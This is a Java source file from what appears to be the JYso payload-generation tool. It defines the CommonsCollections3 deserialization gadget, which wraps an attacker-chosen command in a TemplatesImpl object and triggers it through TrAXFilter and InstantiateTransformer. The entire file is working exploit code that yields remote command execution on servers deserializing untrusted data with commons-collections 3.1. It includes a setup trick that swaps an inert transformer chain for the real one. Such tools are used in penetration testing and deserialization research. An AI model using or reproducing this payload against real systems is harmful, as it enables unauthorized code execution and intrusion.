package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.JavaVersion;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;

import static com.qi4l.JYso.gadgets.cc1.get_CC_Sink;


/**
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

@SuppressWarnings({"restriction", "unused"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class cc3 implements ObjectPayload<Object> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }

    public Object getObject(String command) throws Exception {
        final Object templatesImpl;
        templatesImpl = Gadgets.createTemplatesImpl(command);


        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl})};

        return get_CC_Sink(transformerChain, transformers);
    }
}
